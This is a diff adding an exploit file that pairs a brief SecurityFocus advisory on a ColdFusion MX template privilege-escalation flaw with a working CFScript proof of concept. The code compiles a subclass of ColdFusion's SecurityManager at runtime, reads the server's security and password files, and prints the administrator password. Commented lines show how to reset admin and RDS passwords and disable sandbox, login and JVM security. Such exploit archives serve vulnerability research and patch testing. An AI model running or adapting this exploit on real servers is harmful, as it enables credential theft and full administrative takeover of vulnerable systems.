@@ -1,0 +1,108 @@
+source: http://www.securityfocus.com/bid/11316/info
+
+Reportedly Macromedia ColdFusion MX is affected by privilege escalation vulnerability when handling templates. This issue is due to an access validation error that allows a user to perform actions with administrator privileges.
+
+An attacker may exploit this issue to gain administrative privileges on a computer running the vulnerable application.
+
+<cfscript>
+
+objFileWriter = CreateObject("java","java.io.FileWriter");
+
+objByteArray = CreateObject("java","java.io.ByteArrayOutputStream");
+
+objJavaC = CreateObject("java","sun.tools.javac.Main");
+
+objString = CreateObject("java","java.lang.String");
+
+objFile = CreateObject("java","java.io.File");
+
+if (Server.Os.Name IS "Windows") { s = "\"; } else { s = "/"; }
+
+strJavaSource = "#Server.ColdFusion.Rootdir##s#lib#s#SecurityExploit.java"; 
+
+strCfusionJar = "#Server.ColdFusion.Rootdir##s#lib#s#cfusion.jar";
+
+strNeoSecFile = "#Server.ColdFusion.Rootdir##s#lib#s#neo-security.xml";
+
+strPasswdFile = "#Server.ColdFusion.Rootdir##s#lib#s#password.properties";
+
+fileWriter = objFileWriter.init("#strJavaSource#",false);
+
+fileWriter.write("import coldfusion.security.SecurityManager;");
+
+fileWriter.write("import java.io.File;");
+
+fileWriter.write("public class SecurityExploit extends SecurityManager {");
+
+fileWriter.write("public SecurityExploit(File arg0, File arg1) {");
+
+fileWriter.write("super(arg0, arg1); }");
+
+fileWriter.write("public boolean isAdminSecurityEnabled(){");
+
+fileWriter.write("return false;}}");
+
+fileWriter.flush();
+
+fileWriter.close();
+
+str = objString.init("-classpath,#strCfusionJar#,#strJavaSource#");
+
+strArr = str.split(",");
+
+byteArray = objByteArray.init();
+
+compileObj =objJavaC.init(byteArray,str);
+
+compileObj.compile(strArr);
+
+obj = CreateObject("java","SecurityExploit");
+
+file1 = objFile.init("#strNeoSecFile#");
+
+file2 = objFile.init("#strPasswdFile#");
+
+obj.init(file1,file2);
+
+obj.load();
+
+</cfscript>
+
+<cfscript>
+
+// Get Administrator Password 
+
+strAdminPw = obj.getAdminPassword();
+
+// Set Administrator Password
+
+//obj.setAdminPassword("test123");
+
+
+// Turn off Sandbox Security
+
+//obj.setSandboxSecurityEnabled(false);
+
+
+// Turn off Administrator Login
+
+//obj.setAdminSecurityEnabled(false);
+
+
+// Turn off RDS Login
+
+//obj.setRdsSecurityEnabled(false);
+
+
+// Set RDS Password
+
+//obj.setRdsPassword("test123");
+
+
+// Turn off JVM Security
+
+//obj.setJvmSecurityEnabled(false);
+
+</cfscript>
+
+<cfoutput>Adminstrator Password: #strAdminPw#</cfoutput>
